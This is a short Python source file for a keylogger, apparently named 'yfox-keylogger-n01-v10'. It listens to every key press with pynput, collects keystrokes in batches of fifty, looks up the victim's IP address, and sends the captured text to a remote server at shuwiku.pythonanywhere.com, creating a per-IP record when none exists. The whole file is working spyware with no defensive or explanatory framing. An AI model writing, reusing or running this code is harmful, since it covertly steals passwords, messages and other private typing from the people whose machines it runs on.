from pynput.keyboard import Key, Listener

import response
import scripts


keys_list = []
server = 'http://shuwiku.pythonanywhere.com'
app = 'yfox-keylogger-n01-v10'


def button_pressed(key):
    key = str(key).replace("'", "")
    formated_key = key if 'Key' not in key else str(f'[{key.split(".")[-1]}]')
    handler(formated_key)


def handler(key):
    global keys_list, server, app

    keys_list.append(key)
    keys_list_len = len(keys_list)

    if (keys_list_len >= 50):
        data = ''.join(keys_list)
        data_type = 'list'
        ip = scripts.user_ip()

        res = response.response_handler('update', server, app, ip, data, data_type)
        res_result = res.json()
        res_error = res_result.get('error')

        if (res_error is not None):

            if (res_error == 'bad ip (user with this ip does not exist)'):
                res = response.response_handler('create', server, app, ip, data, data_type)
                res_result = res.json()
                print('file created')

        print('file updated')
        keys_list.clear()


with Listener(on_press=button_pressed) as listener:
    listener.join()
